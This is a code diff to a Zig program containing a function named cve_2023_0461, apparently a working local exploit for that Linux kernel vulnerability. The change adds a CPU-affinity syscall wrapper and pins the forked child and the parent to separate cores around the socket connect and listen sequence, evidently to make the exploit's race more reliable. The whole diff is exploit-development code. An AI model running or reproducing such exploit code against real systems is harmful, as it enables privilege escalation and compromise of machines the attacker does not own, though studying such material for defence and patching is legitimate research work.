@@ -199,6 +199,16 @@ pub fn splice(fd_in: l.fd_t, off_in: ?*l.off_t, fd_out: l.fd_t, off_out: ?*l.off
     }
 }
 
+fn sched_setaffinity(pid: l.pid_t, set: *const l.cpu_set_t) !void {
+    const size = @sizeOf(l.cpu_set_t);
+    const rc = l.syscall3(.sched_setaffinity, @as(usize, @bitCast(@as(isize, pid))), size, @intFromPtr(set));
+
+    switch (errno(rc)) {
+        .SUCCESS => return,
+        else => |err| return os.unexpectedErrno(err),
+    }
+}
+
 fn retry_connect(sock: os.socket_t, sock_addr: *const os.sockaddr, len: os.socklen_t) !void {
     var n: u8 = 100;
     var last_err: os.ConnectError = undefined;
@@ -320,6 +330,9 @@ fn cve_2023_0461() !void {
     const target_addr_p: *const l.sockaddr = @ptrCast(&target_addr.sa);
     const unspec_addr = l.sockaddr{ .family = l.AF.UNSPEC, .data = undefined };
     const addr_sz = @sizeOf(@TypeOf(server_addr.sa));
+    const cpus: l.cpu_set_t = undefined;
+    const cpu0001: l.cpu_set_t = [1]usize{0b0001} ++ ([_]usize{0} ** (cpus.len - 1));
+    const cpu1110: l.cpu_set_t = [1]usize{0b1110} ++ ([_]usize{0} ** (cpus.len - 1));
 
     var env = try std.process.getEnvMap(allc);
     defer env.deinit();
@@ -340,6 +353,7 @@ fn cve_2023_0461() !void {
     const child_pid = try os.fork();
 
     if (child_pid == 0) {
+        try sched_setaffinity(0, &cpu1110);
         log.info("child: listen for first connection", .{});
         const server_sk = try os.socket(os.AF.INET, os.SOCK.STREAM, 0);
         defer os.closeSocket(server_sk);
@@ -510,6 +524,7 @@ fn cve_2023_0461() !void {
     }
 
     defer _ = os.waitpid(child_pid, 0);
+    try sched_setaffinity(0, &cpu0001);
     log.info("parent: connect for first connection", .{});
 
     try psync.wait(0);
